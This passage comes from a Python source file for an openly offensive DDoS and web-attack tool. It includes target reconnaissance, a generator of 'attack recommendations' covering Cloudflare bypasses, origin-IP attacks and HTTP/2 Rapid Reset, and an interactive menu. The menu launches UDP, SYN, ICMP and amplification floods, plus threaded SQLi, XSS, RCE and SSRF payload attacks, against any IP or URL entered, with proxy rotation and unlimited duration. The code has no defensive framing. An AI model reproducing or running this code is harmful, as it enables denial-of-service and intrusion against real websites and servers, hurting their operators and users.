            print(f"  {Fore.RED}[!] Heavy rate limiting detected! {blocked}/30 blocked{Style.RESET_ALL}")
            print(f"  {Fore.CYAN}Status codes: {Counter(status_codes)}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}[✓] No rate limiting detected{Style.RESET_ALL}")
        
        return self.rate_limited
    
    def detect_technologies(self):
        print(f"{Fore.YELLOW}[*] Detecting technologies...{Style.RESET_ALL}")
        try:
            resp = requests.get(self.target_url, timeout=10, verify=False)
            headers = resp.headers
            html = resp.text.lower()
            
            tech_patterns = {
                'WordPress': ['wp-content', 'wp-includes', 'wordpress', 'wp-json', 'xmlrpc.php'],
                'Laravel': ['laravel', 'csrf-token', 'laravel_session'],
                'React': ['react', 'react-dom', '_next', 'nextjs'],
                'Vue.js': ['vue.js', 'vue-router', 'vuex', 'data-v-'],
                'Angular': ['ng-version', 'angular', 'ng-app'],
                'jQuery': ['jquery', '$('],
                'Bootstrap': ['bootstrap', 'bs-'],
                'Django': ['csrfmiddlewaretoken', 'django', 'static/admin'],
                'Rails': ['csrf-param', 'rails', 'authenticity_token'],
                'Spring': ['_csrf', 'spring', 'java'],
                'Shopify': ['cdn.shopify', 'myshopify', 'shopify'],
                'WooCommerce': ['woocommerce', 'product_id', 'add-to-cart'],
                'Magento': ['magento', 'skin/frontend', 'Mage.'],
                'Drupal': ['drupal', 'sites/default', 'Drupal.settings'],
                'Joomla': ['joomla', 'media/system', 'com_content'],
                'CodeIgniter': ['ci_session', 'CodeIgniter'],
                'Symfony': ['symfony', '_sf2_'],
                'Yii': ['yii', 'Yii::'],
            }
            
            detected = []
            for tech, patterns in tech_patterns.items():
                for pattern in patterns:
                    if pattern in html or pattern in str(headers).lower():
                        detected.append(tech)
                        break
            
            if detected:
                self.technologies = list(set(detected))
                print(f"  {Fore.GREEN}[+] Technologies: {', '.join(self.technologies)}{Style.RESET_ALL}")
            else:
                print(f"  {Fore.CYAN}[!] No specific technologies detected{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"  {Fore.RED}[!] Tech detection failed{Style.RESET_ALL}")
        
        return self.technologies
    
    def measure_response_time(self):
        print(f"{Fore.YELLOW}[*] Measuring response time...{Style.RESET_ALL}")
        times = []
        for _ in range(10):
            try:
                start = time.time()
                requests.get(self.target_url, timeout=10, verify=False)
                times.append(time.time() - start)
            except:
                pass
            time.sleep(0.5)
        
        self.response_time = sum(times) / len(times) if times else 1.0
        if self.response_time < 0.2:
            print(f"  {Fore.GREEN}Response: {self.response_time*1000:.0f}ms (Fast){Style.RESET_ALL}")
        elif self.response_time < 1.0:
            print(f"  {Fore.YELLOW}Response: {self.response_time*1000:.0f}ms (Medium){Style.RESET_ALL}")
        else:
            print(f"  {Fore.RED}Response: {self.response_time*1000:.0f}ms (Slow - Vulnerable){Style.RESET_ALL}")
        
        return self.response_time
    
    def check_ssl(self):
        print(f"{Fore.YELLOW}[*] Checking SSL/TLS...{Style.RESET_ALL}")
        if self.target_port == 443 or self.target_url.startswith('https'):
            try:
                context = ssl.create_default_context()
                with socket.create_connection((self.target_host, self.target_port), timeout=5) as sock:
                    with context.wrap_socket(sock, server_hostname=self.target_host) as ssock:
                        self.ssl_available = True
                        cipher = ssock.cipher()
                        print(f"  {Fore.GREEN}[✓] SSL available - Cipher: {cipher[0] if cipher else 'TLS'}{Style.RESET_ALL}")
            except:
                self.ssl_available = False
                print(f"  {Fore.YELLOW}[!] SSL/TLS issues detected{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[!] No SSL/TLS (HTTP only){Style.RESET_ALL}")
        
        return self.ssl_available
    
    def generate_recommendations(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] WEBSITE ATTACK RECOMMENDATIONS")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        recs = []
        
        if self.waf_type == "cloudflare":
            recs.append(('bypass', 'curl_cffi Impersonate (L7 Bypass)', 'Cloudflare detected - Chrome fingerprint impersonation', min(2000, MAX_THREADS), 90))
            recs.append(('acme', 'ACME Path Bypass', 'Cloudflare 0-day exploit via .well-known/acme-challenge', min(1500, MAX_THREADS), 60))
            if self.origin_ip:
                recs.append(('origin', 'Origin Direct Attack', f'Origin IP: {self.origin_ip} - Bypass Cloudflare completely', min(5000, MAX_THREADS), 60))
                recs.append(('spoof', 'IP Spoofing (L3 Bypass)', 'Bypass Cloudflare L3/L4 filtering', min(4000, MAX_THREADS), 90))
        
        if self.rate_limited:
            recs.append(('port_hop', 'Port Hopping (L4 Bypass)', 'Rate limiting detected - dynamic port randomization', min(3000, MAX_THREADS), 90))
        
        if self.ssl_available:
            recs.append(('ssl', 'SSL Renegotiation', 'SSL/TLS crypto exhaustion attack', min(2000, MAX_THREADS), 60))
        
        if self.response_time > 1.0:
            recs.append(('slow', 'Slowloris Advanced', f'Slow server ({self.response_time*1000:.0f}ms) - connection exhaustion', min(5000, MAX_THREADS), 60))
        
        if 'WordPress' in self.technologies:
            recs.append(('http2', 'HTTP/2 Rapid Reset', 'WordPress detected - HTTP/2 stream reset attack', min(2000, MAX_THREADS), 60))
            recs.append(('xml', 'WordPress XML-RPC Amplification', 'WordPress XML-RPC pingback abuse', min(3000, MAX_THREADS), 60))
        
        if 'Laravel' in self.technologies:
            recs.append(('smuggling', 'HTTP Request Smuggling', 'Laravel detected - CL.TE/TE.CL smuggling', min(2000, MAX_THREADS), 60))
        
        recs.append(('all', 'ALL WEBSITE METHODS (20+ Vectors)', 'Maximum pressure - all attack vectors simultaneously', 0, 120))
        
        for i, (mid, name, reason, thr, dur) in enumerate(recs[:6], 1):
            print(f"{Fore.CYAN}[{i}] {name} (ID: {mid}){Style.RESET_ALL}")
            print(f"    {Fore.YELLOW}→ {reason}{Style.RESET_ALL}")
            print(f"    {Fore.GREEN}→ Threads={thr}, Duration={dur}s{Style.RESET_ALL}\n")
        
        return recs
    
    def full_scan(self):
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[*] WEBSITE AUTO-DETECTION ACTIVE")
        print(f"[*] Target: {self.target_url}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        self.detect_waf_cdn()
        self.discover_origin_ip()
        self.detect_rate_limiting()
        self.detect_technologies()
        self.measure_response_time()
        self.check_ssl()
        recs = self.generate_recommendations()
        
        print(f"{Fore.CYAN}{'='*60}")
        print(f"[+] SCAN COMPLETE")
        print(f"    WAF/CDN: {self.waf_type or 'None'}")
        print(f"    Technologies: {', '.join(self.technologies) if self.technologies else 'None'}")
        print(f"    Rate Limit: {'Yes' if self.rate_limited else 'No'}")
        print(f"    SSL/TLS: {'Yes' if self.ssl_available else 'No'}")
        print(f"    Origin IP: {self.origin_ip or 'Not found'}")
        print(f"{'='*60}{Style.RESET_ALL}\n")
        
        return recs

# ================================ SYSTEM SETUP ================================

def setup_system():
    global MAX_THREADS, MAX_CONNECTIONS
    
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"[*] SYSTEM RESOURCE DETECTION")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] CPU Cores: {CPU_COUNT}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] RAM: {RAM_GB:.1f} GB{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Platform: {platform.system()} {platform.release()}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Max Threads: {MAX_THREADS:,}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Max Connections: {MAX_CONNECTIONS:,}{Style.RESET_ALL}")
    
    print(f"\n{Fore.YELLOW}[?] Configure settings:{Style.RESET_ALL}")
    print(f"    1. AUTO OPTIMIZED (Recommended - Use system optimized settings)")
    print(f"    2. MANUAL (Set thread and connection limits manually)")
    print(f"    3. EXTREME (Maximum performance - may cause instability)")
    
    choice = input(f"{Fore.GREEN}└─> (1/2/3): {Style.RESET_ALL}").strip()
    
    if choice == "2":
        print(f"{Fore.YELLOW}[?] Enter max threads:{Style.RESET_ALL}")
        thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        if thr_input.isdigit():
            MAX_THREADS = int(thr_input)
        
        print(f"{Fore.YELLOW}[?] Enter max connections:{Style.RESET_ALL}")
        conn_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        if conn_input.isdigit():
            MAX_CONNECTIONS = int(conn_input)
    
    elif choice == "3":
        MAX_THREADS = min(MAX_THREADS * 2, 300000)
        MAX_CONNECTIONS = min(MAX_CONNECTIONS * 2, 200000)
        print(f"{Fore.RED}[!] EXTREME MODE ACTIVATED - May cause system instability{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}[+] Using Max Threads: {MAX_THREADS:,}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Using Max Connections: {MAX_CONNECTIONS:,}{Style.RESET_ALL}")
    
    # Increase file limits on Linux
    if platform.system() != 'Windows':
        try:
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (MAX_CONNECTIONS + 50000, MAX_CONNECTIONS + 50000))
            print(f"{Fore.GREEN}[+] File descriptor limit increased to {MAX_CONNECTIONS + 50000}{Style.RESET_ALL}")
        except:
            pass

# ================================ PROXY MANAGEMENT ================================

def setup_proxies():
    print(f"\n{Fore.YELLOW}[?] Use proxy rotation? (y/n):{Style.RESET_ALL}")
    use_proxy = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip().lower()
    
    if use_proxy == 'y':
        print(f"{Fore.YELLOW}[*] Fetching proxies...{Style.RESET_ALL}")
        load_proxies()
    else:
        print(f"{Fore.CYAN}[+] Skipping proxy setup{Style.RESET_ALL}")

# ================================ MAIN FUNCTION ================================

def main():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print(BANNER)
    load_user_agents()
    setup_system()
    setup_proxies()
    
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}{'='*60}")
    print(f"[!] SELECT TARGET TYPE:")
    print(f"    1. WEBSITE (HTTP/HTTPS - Web Application, API, CMS)")
    print(f"    2. SERVER (IP Address - Game Server, Database, SSH, etc)")
    print(f"{'='*60}{Style.RESET_ALL}")
    
    target_type = input(f"{Fore.GREEN}└─> (1/2): {Style.RESET_ALL}").strip()
    
    if target_type == "2":
        # ==================== SERVER ATTACK MODE ====================
        print(f"\n{Fore.YELLOW}[?] Target IP Address:{Style.RESET_ALL}")
        target_ip = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        
        print(f"{Fore.YELLOW}[?] Target Port (default: 80):{Style.RESET_ALL}")
        port_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        target_port = int(port_input) if port_input.isdigit() else 80
        
        print(f"\n{Fore.CYAN}[+] Target: {target_ip}:{target_port}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA}[?] Attack Mode:{Style.RESET_ALL}")
        print(f"    1. AUTO DDOS (Recommended - Full auto-detection)")
        print(f"    2. MANUAL (Choose attack method manually)")
        print(f"    3. PAYLOAD ATTACK (Send exploitation payloads)")
        
        mode_choice = input(f"{Fore.GREEN}└─> (1/2/3): {Style.RESET_ALL}").strip()
        
        if mode_choice == "3":
            print(f"\n{Fore.YELLOW}[*] Payload Mode - Select payload type:{Style.RESET_ALL}")
            print(f"    1. SQL Injection")
            print(f"    2. XSS (Cross-Site Scripting)")
            print(f"    3. Path Traversal")
            print(f"    4. RCE (Remote Code Execution)")
            print(f"    5. LFI (Local File Inclusion)")
            print(f"    6. XXE (XML External Entity)")
            print(f"    7. SSRF (Server-Side Request Forgery)")
            print(f"    8. ALL PAYLOADS")
            
            payload_choice = input(f"{Fore.GREEN}└─> (1-8): {Style.RESET_ALL}").strip()
            
            payload_map = {
                "1": PayloadGenerator.sql_injection_payloads(),
                "2": PayloadGenerator.xss_payloads(),
                "3": PayloadGenerator.path_traversal_payloads(),
                "4": PayloadGenerator.rce_payloads(),
                "5": PayloadGenerator.lfi_payloads(),
                "6": PayloadGenerator.xxe_payloads(),
                "7": PayloadGenerator.ssrf_payloads(),
                "8": PayloadGenerator.generate_all_payloads(),
            }
            
            payloads = payload_map.get(payload_choice, PayloadGenerator.generate_all_payloads())
            print(f"{Fore.GREEN}[+] Loaded {len(payloads)} payloads{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}[?] Threads (default 1000):{Style.RESET_ALL}")
            thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            threads = int(thr_input) if thr_input.isdigit() else 1000
            
            print(f"{Fore.YELLOW}[?] Duration (0=infinite):{Style.RESET_ALL}")
            dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            duration = int(dur_input) if dur_input.isdigit() else 60
            
            print(f"\n{Fore.RED}[!!!] LAUNCHING PAYLOAD ATTACK{Style.RESET_ALL}\n")
            stats["start_time"] = time.time()
            threading.Thread(target=status_printer, daemon=True).start()
            
            def payload_worker():
                while not stop_attack.is_set():
                    try:
                        payload = random.choice(payloads)
                        if target_port == 80 or target_port == 443:
                            url = f"http{'s' if target_port==443 else ''}://{target_ip}:{target_port}/"
                            requests.get(url, params={'q': payload, 'search': payload}, timeout=2)
                        else:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(2)
                            sock.connect((target_ip, target_port))
                            sock.send(payload.encode() + b'\r\n')
                            sock.close()
                        update_stats(sent=1, method="payload_attack")
                    except:
                        update_stats(error=True)
            
            for _ in range(min(threads, MAX_THREADS)):
                threading.Thread(target=payload_worker, daemon=True).start()
        
        elif mode_choice == "1":
            print(f"\n{Fore.GREEN}[!!!] AUTO DDOS MODE ACTIVATED{Style.RESET_ALL}\n")
            detector = ServerAutoDetection(target_ip, target_port)
            recommendations = detector.full_scan()
            
            if recommendations:
                best = recommendations[0]
                print(f"{Fore.GREEN}[+] Using recommendation:{Style.RESET_ALL}")
                print(f"    Method: {best[1]}")
                print(f"    Threads: {best[3]}")
                print(f"    Duration: {best[4]}s")
                print(f"\n{Fore.YELLOW}[?] Use this recommendation? (Enter for yes, n for custom):{Style.RESET_ALL}")
                confirm = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip().lower()
                
                if confirm == 'n':
                    print(f"{Fore.YELLOW}[?] Enter method id (udp/syn/conn/amp/slow/game/ssl/icmp/rst/ntp/dns/all):{Style.RESET_ALL}")
                    method_id = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    print(f"{Fore.YELLOW}[?] Enter threads:{Style.RESET_ALL}")
                    thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    threads = int(thr_input) if thr_input.isdigit() else best[3]
                    print(f"{Fore.YELLOW}[?] Enter duration:{Style.RESET_ALL}")
                    dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    duration = int(dur_input) if dur_input.isdigit() else best[4]
                else:
                    method_id = best[0]
                    threads = best[3]
                    duration = best[4]
            else:
                method_id = "all"
                threads = min(3000, MAX_THREADS)
                duration = 60
        else:
            print(f"\n{Fore.YELLOW}[+] Server Attack Methods:{Style.RESET_ALL}")
            server_methods = [
                ("udp", "UDP Flood"),
                ("syn", "SYN Flood"),
                ("conn", "Connection Exhaustion"),
                ("amp", "Amplification DDoS"),
                ("slow", "Slow Loris Server"),
                ("game", "Game Server Ping Flood"),
                ("ssl", "SSL Exhaustion"),
                ("icmp", "ICMP Flood"),
                ("rst", "TCP RST Flood"),
                ("ntp", "NTP Monlist Flood"),
                ("dns", "DNS Amplification"),
                ("all", "ALL METHODS COMBINED (15 Vectors)"),
            ]
            
            for i, (mid, name) in enumerate(server_methods, 1):
                print(f"  {Fore.GREEN}{i}{Style.RESET_ALL}. {name}")
            
            method_choice = input(f"\n{Fore.GREEN}[?] Select method (1-12):{Style.RESET_ALL} ").strip()
            method_map_server = {
                "1": "udp", "2": "syn", "3": "conn", "4": "amp", "5": "slow",
                "6": "game", "7": "ssl", "8": "icmp", "9": "rst", "10": "ntp",
                "11": "dns", "12": "all"
            }
            method_id = method_map_server.get(method_choice, "all")
            
            print(f"{Fore.YELLOW}[?] Threads (default 2000):{Style.RESET_ALL}")
            thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            threads = int(thr_input) if thr_input.isdigit() else 2000
            
            print(f"{Fore.YELLOW}[?] Duration (0=infinite):{Style.RESET_ALL}")
            dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            duration = int(dur_input) if dur_input.isdigit() else 60
        
        # Execute server attack
        print(f"\n{Fore.RED}{Style.BRIGHT}[!!!] LAUNCHING SERVER ATTACK - PRESS CTRL+C TO STOP [!!!]{Style.RESET_ALL}\n")
        
        stats["start_time"] = time.time()
        threading.Thread(target=status_printer, daemon=True).start()
        
        method_map = {
            "udp": lambda: ServerAttackMethods.udp_flood_server(target_ip, target_port, threads),
            "syn": lambda: ServerAttackMethods.syn_flood_server(target_ip, target_port, threads),
            "conn": lambda: ServerAttackMethods.connection_exhaustion(target_ip, target_port, threads),
            "amp": lambda: ServerAttackMethods.amp_ddos_server(target_ip, target_port, threads),
            "slow": lambda: ServerAttackMethods.slow_loris_server(target_ip, target_port, threads),
            "game": lambda: ServerAttackMethods.game_ping_flood(target_ip, target_port, threads),
            "ssl": lambda: ServerAttackMethods.ssl_exhaustion_server(target_ip, target_port, threads),
            "icmp": lambda: ServerAttackMethods.icmp_flood_server(target_ip, threads),
            "rst": lambda: ServerAttackMethods.tcp_rst_flood(target_ip, target_port, threads),
            "ntp": lambda: ServerAttackMethods.ntp_monlist_flood(target_ip, threads),
            "dns": lambda: ServerAttackMethods.dns_amplification(target_ip, threads),
            "all": lambda: ServerAttackMethods.all_server_combined(target_ip, target_port),
        }
        method_map.get(method_id, method_map["all"])()
        
    else:
        # ==================== WEBSITE ATTACK MODE ====================
        print(f"\n{Fore.YELLOW}[?] Target URL (https://example.com):{Style.RESET_ALL}")
        target_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
        
        if not target_input.startswith(('http://', 'https://')):
            target_input = 'https://' + target_input
        
        parsed = urlparse(target_input)
        target_host = parsed.netloc.split(':')[0]
        target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        target_url = f"{parsed.scheme}://{target_host}:{target_port}{parsed.path or '/'}"
        
        print(f"\n{Fore.CYAN}[+] Target: {target_url}")
        print(f"[+] Host: {target_host} | Port: {target_port}{Style.RESET_ALL}")
        
        print(f"\n{Fore.MAGENTA}[?] Attack Mode:{Style.RESET_ALL}")
        print(f"    1. AUTO DDOS (Recommended - Full auto-detection + WAF bypass)")
        print(f"    2. MANUAL (Choose attack method manually)")
        print(f"    3. PAYLOAD ATTACK (SQLi/XSS/LFI/RCE/SSRF)")
        
        mode_choice = input(f"{Fore.GREEN}└─> (1/2/3): {Style.RESET_ALL}").strip()
        
        if mode_choice == "3":
            print(f"\n{Fore.YELLOW}[*] Payload Mode - Select payload type:{Style.RESET_ALL}")
            print(f"    1. SQL Injection")
            print(f"    2. XSS (Cross-Site Scripting)")
            print(f"    3. Path Traversal")
            print(f"    4. RCE (Remote Code Execution)")
            print(f"    5. LFI (Local File Inclusion)")
            print(f"    6. XXE (XML External Entity)")
            print(f"    7. SSRF (Server-Side Request Forgery)")
            print(f"    8. Deserialization Attack")
            print(f"    9. ALL PAYLOADS (100+ Payloads)")
            
            payload_choice = input(f"{Fore.GREEN}└─> (1-9): {Style.RESET_ALL}").strip()
            
            payload_map = {
                "1": PayloadGenerator.sql_injection_payloads(),
                "2": PayloadGenerator.xss_payloads(),
                "3": PayloadGenerator.path_traversal_payloads(),
                "4": PayloadGenerator.rce_payloads(),
                "5": PayloadGenerator.lfi_payloads(),
                "6": PayloadGenerator.xxe_payloads(),
                "7": PayloadGenerator.ssrf_payloads(),
                "8": PayloadGenerator.deserialization_payloads(),
                "9": PayloadGenerator.generate_all_payloads(),
            }
            
            payloads = payload_map.get(payload_choice, PayloadGenerator.generate_all_payloads())
            print(f"{Fore.GREEN}[+] Loaded {len(payloads)} payloads{Style.RESET_ALL}")
            
            print(f"{Fore.YELLOW}[?] Threads (default 1000):{Style.RESET_ALL}")
            thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            threads = int(thr_input) if thr_input.isdigit() else 1000
            
            print(f"{Fore.YELLOW}[?] Duration (0=infinite):{Style.RESET_ALL}")
            dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            duration = int(dur_input) if dur_input.isdigit() else 60
            
            print(f"\n{Fore.RED}[!!!] LAUNCHING PAYLOAD ATTACK{Style.RESET_ALL}\n")
            stats["start_time"] = time.time()
            threading.Thread(target=status_printer, daemon=True).start()
            
            def payload_worker():
                while not stop_attack.is_set():
                    try:
                        payload = random.choice(payloads)
                        params = {'id': payload, 'q': payload, 'search': payload, 'user': payload, 'page': payload}
                        requests.get(target_url, params=params, headers=get_random_headers(), timeout=2)
                        requests.post(target_url, data={'data': payload, 'json': payload}, headers=get_random_headers(), timeout=2)
                        update_stats(sent=2, method="payload_website")
                    except:
                        update_stats(error=True)
            
            for _ in range(min(threads, MAX_THREADS)):
                threading.Thread(target=payload_worker, daemon=True).start()
        
        elif mode_choice == "1":
            print(f"\n{Fore.GREEN}[!!!] AUTO DDOS MODE ACTIVATED{Style.RESET_ALL}\n")
            detector = WebsiteAutoDetection(target_url, target_host, target_port)
            recommendations = detector.full_scan()
            
            if recommendations:
                best = recommendations[0]
                print(f"{Fore.GREEN}[+] Using recommendation:{Style.RESET_ALL}")
                print(f"    Method: {best[1]}")
                print(f"    Threads: {best[3]}")
                print(f"    Duration: {best[4]}s")
                print(f"\n{Fore.YELLOW}[?] Use this recommendation? (Enter for yes, n for custom):{Style.RESET_ALL}")
                confirm = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip().lower()
                
                if confirm == 'n':
                    print(f"{Fore.YELLOW}[?] Enter method id (bypass/origin/spoof/port_hop/curl/acme/ssl/slow/http2/all):{Style.RESET_ALL}")
                    method_id = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    print(f"{Fore.YELLOW}[?] Enter threads:{Style.RESET_ALL}")
                    thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    threads = int(thr_input) if thr_input.isdigit() else best[3]
                    print(f"{Fore.YELLOW}[?] Enter duration:{Style.RESET_ALL}")
                    dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
                    duration = int(dur_input) if dur_input.isdigit() else best[4]
                else:
                    method_id = best[0]
                    threads = best[3]
                    duration = best[4]
            else:
                method_id = "all"
                threads = min(3000, MAX_THREADS)
                duration = 60
        else:
            print(f"\n{Fore.YELLOW}[+] Website Attack Methods:{Style.RESET_ALL}")
            website_methods = [
                ("1", "HTTP/2 Rapid Reset (CVE-2023-44487)"),
                ("2", "Slowloris Advanced"),
                ("3", "SYN Flood"),
                ("4", "UDP Amplification"),
                ("5", "SSL Renegotiation"),
                ("6", "WebSocket Flood"),
                ("7", "GraphQL Depth Attack"),
                ("8", "Range Header DoS (CVE-2018-6389)"),
                ("9", "HTTP Pipeline Flood"),
                ("10", "JSON Deserialization Bomb"),
                ("11", "HTTP Request Smuggling"),
                ("12", "IP Spoofing (L3 Cloudflare Bypass)"),
                ("13", "Port Hopping (L4 Cloudflare Bypass)"),
                ("14", "curl_cffi Impersonate (L7 Bypass)"),
                ("15", "ACME Path Bypass (Cloudflare 0-day)"),
                ("16", "Origin Direct Attack"),
                ("17", "HTTP/2 Stream Reset"),
                ("18", "HTTP Cache Poisoning"),
                ("19", "HTTP Method Override"),
                ("20", "ALL METHODS COMBINED (20+ Vectors)"),
            ]
            
            for mid, name in website_methods:
                print(f"  {Fore.GREEN}{mid}{Style.RESET_ALL}. {name}")
            
            method_choice = input(f"\n{Fore.GREEN}[?] Select method (1-20):{Style.RESET_ALL} ").strip()
            
            print(f"{Fore.YELLOW}[?] Threads (default 2000):{Style.RESET_ALL}")
            thr_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            threads = int(thr_input) if thr_input.isdigit() else 2000
            
            print(f"{Fore.YELLOW}[?] Duration (0=infinite):{Style.RESET_ALL}")
            dur_input = input(f"{Fore.GREEN}└─> {Style.RESET_ALL}").strip()
            duration = int(dur_input) if dur_input.isdigit() else 60
            
            method_id = method_choice
        
        # Execute website attack
        print(f"\n{Fore.RED}{Style.BRIGHT}[!!!] LAUNCHING WEBSITE ATTACK - PRESS CTRL+C TO STOP [!!!]{Style.RESET_ALL}\n")
        
        stats["start_time"] = time.time()
        threading.Thread(target=status_printer, daemon=True).start()
        
        ws_url = target_url.replace('http', 'ws')
        website_map = {
            "1": lambda: WebsiteAttackMethods.http2_rapid_reset(target_url, threads),
            "2": lambda: WebsiteAttackMethods.slowloris_advanced(target_host, target_port, threads),
            "3": lambda: WebsiteAttackMethods.syn_flood(target_host, target_port, threads),
            "4": lambda: WebsiteAttackMethods.udp_amplification(target_host, threads),
            "5": lambda: WebsiteAttackMethods.ssl_renegotiation(target_host, target_port, threads),
            "6": lambda: WebsiteAttackMethods.websocket_flood(ws_url, threads),
            "7": lambda: WebsiteAttackMethods.graphql_depth(target_url, threads),
            "8": lambda: WebsiteAttackMethods.range_dos(target_url, threads),
            "9": lambda: WebsiteAttackMethods.http_pipeline(target_host, target_port, threads),
            "10": lambda: WebsiteAttackMethods.json_bomb(target_url, threads),
            "11": lambda: WebsiteAttackMethods.http_smuggling(target_host, target_port, threads),
            "12": lambda: WebsiteBypass.ip_spoofing(target_host, target_port, threads),
            "13": lambda: WebsiteBypass.port_hopping(target_host, target_port, threads),
            "14": lambda: WebsiteBypass.curl_cffi_impersonate(target_url, threads),
            "15": lambda: WebsiteBypass.acme_path_bypass(target_url, threads),
            "16": lambda: WebsiteBypass.origin_direct_attack(target_host, target_port, threads),
            "17": lambda: WebsiteAttackMethods.http2_stream_reset(target_url, threads),
            "18": lambda: WebsiteAttackMethods.http_cache_poison(target_url, threads),
            "19": lambda: WebsiteAttackMethods.http_method_override(target_url, threads),
            "20": lambda: WebsiteAttackMethods.all_website_combined(target_url, target_host, target_port),
            "bypass": lambda: WebsiteBypass.curl_cffi_impersonate(target_url, threads),
            "origin": lambda: WebsiteBypass.origin_direct_attack(target_host, target_port, threads),
            "spoof": lambda: WebsiteBypass.ip_spoofing(target_host, target_port, threads),
            "acme": lambda: WebsiteBypass.acme_path_bypass(target_url, threads),
            "all": lambda: WebsiteAttackMethods.all_website_combined(target_url, target_host, target_port),
        }
        website_map.get(method_id, website_map["20"])()
    
    if duration > 0:
        time.sleep(duration)
        stop_attack.set()
    else:
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            stop_attack.set()
    
    # Final statistics
    elapsed = int(time.time() - stats["start_time"]) if stats["start_time"] else 0
    
    print(f"\n\n{Fore.YELLOW}{'='*60}")
    print(f"[+] ATTACK FINISHED")
    print(f"{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Total Requests: {stats['requests_sent']:,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Total Data Sent: {stats['bytes_sent']/1024/1024:.2f} MB{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Average RPS: {stats['requests_sent']/max(1, elapsed):.0f}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Errors: {stats['errors']:,}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}    Duration: {elapsed//60}:{elapsed%60:02d} minutes{Style.RESET_ALL}")
    
    if stats["methods_used"]:
        print(f"{Fore.CYAN}    Methods Used: {', '.join(stats['methods_used'].keys())}{Style.RESET_ALL}")
    
    # Save log
    log_attack(target_input if target_type != "2" else target_ip, method_id, threads, duration, stats["requests_sent"], stats["bytes_sent"])
    print(f"{Fore.GREEN}[+] Attack log saved to attack_log.json{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{'='*60}{Style.RESET_ALL}\n")

if __name__ == "__main__":
    main()